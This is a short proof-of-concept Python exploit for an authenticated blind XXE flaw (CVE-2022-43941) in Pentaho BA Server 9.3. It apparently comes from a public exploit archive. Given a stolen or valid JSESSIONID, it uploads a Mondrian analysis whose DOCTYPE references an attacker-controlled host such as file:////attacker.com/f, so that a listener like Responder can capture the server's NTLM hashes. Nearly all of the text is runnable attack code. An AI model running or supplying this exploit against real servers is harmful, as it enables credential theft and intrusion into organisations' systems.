# Title: Pentaho BA Server EE 9.3.0.0-428 - Blind XXE (Authenticated)
# Author: dwbzn
# Date: 2022-04-04
# Vendor: https://www.hitachivantara.com/
# Software Link: https://www.hitachivantara.com/en-us/products/lumada-dataops/data-integration-analytics/download-pentaho.html
# Version: Pentaho BA Server 9.3.0.0-428
# CVE: CVE-2022-43941
# Tested on: Windows 11
# Credits: https://research.aurainfosec.io/pentest/pentah0wnage

# Authenticated XXE (https://research.aurainfosec.io/pentest/pentah0wnage)
import requests
import argparse


parser = argparse.ArgumentParser(description='CVE-XXXX - Authenticated XXE in Pentaho BA Server via Mondrian Analytics\n\nUse file:////<host running responder> to grab NTLM hashes', formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('baseurl', type=str, help='base url e.g. http://127.0.0.1:8080/pentaho')
parser.add_argument('-j', metavar='JSESSIONID', type=str, help='JSESSIONID of user with Create Content privileges', required=True)
parser.add_argument('-r', metavar='RHOST', type=str, help='url of remote host e.g. file:////attacker.com/f', required=True)
parser.add_argument('-d', metavar='DATASOURCE', type=str, default='SampleData', nargs='?', help="datasource to run analytics on - change if SampleData doesn't exist", required=False)

args = parser.parse_args()

session = requests.session()
session.cookies.set("JSESSIONID",value=args.j)
files = {
    "parameters": f'Datasource="{args.d}";overwrite=true',
    "uploadAnalysis": f'<!DOCTYPE data SYSTEM "{str(args.r)}">'
}
upload = session.post(f'{args.baseurl}/plugin/data-access/api/mondrian/postAnalysis', files=files)

print(upload.text)
if upload.text == '3':
    print ("success!")
else:
    print ("didn't work.")
